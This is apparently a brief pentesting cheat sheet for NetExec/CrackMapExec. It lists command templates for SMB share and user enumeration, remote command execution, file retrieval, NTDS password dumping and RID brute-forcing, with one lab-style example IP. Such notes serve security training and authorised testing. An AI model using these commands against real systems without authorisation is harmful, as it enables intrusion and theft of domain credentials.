**Netexec** can enumerate users and their privileges on Windows systems using different type of protocols.
### Basic Usage
```bash
netexec <protocol> <ip> -u 'username' -p 'password'
```

Once you have successfully authenticated to the SMB service on the target machine using **CrackMapExec** (CME), there are several actions you can take to further assess the security of the system or gather more information. Here’s a list of potential next steps:

- Enumerate Shares

```bash
netexec <protocol> <ip> -u 'username' -p 'password' --shares
```

- Execute Commands Remotely

```bash
netexec <protocol> <ip> -u 'username' -p 'password' -x 'command'
```

- Access shared files

```bash
netexec <protocol> <ip> -u 'username' -p 'password' --get 'share_name/file_path'
```

- Check User and Group Information

```bash
netexec <protocol> <ip> -u 'username' -p 'password' --users
```


- Password Dumping

```bash
netexec smb <ip> -u 'username' -p 'password' --ntds
```

### --rid-brute
This option enables the RID (Relative Identifier) brute-force enumeration feature. It tells CrackMapExec to try various RIDs to enumerate user accounts and retrieve their security identifiers (SIDs). This is useful for discovering valid usernames on the target system, especially if the `guest` account successfully authenticates.
```bash
nxc smb 10.10.11.35 -u 'guest' -p '' --rid-brute
```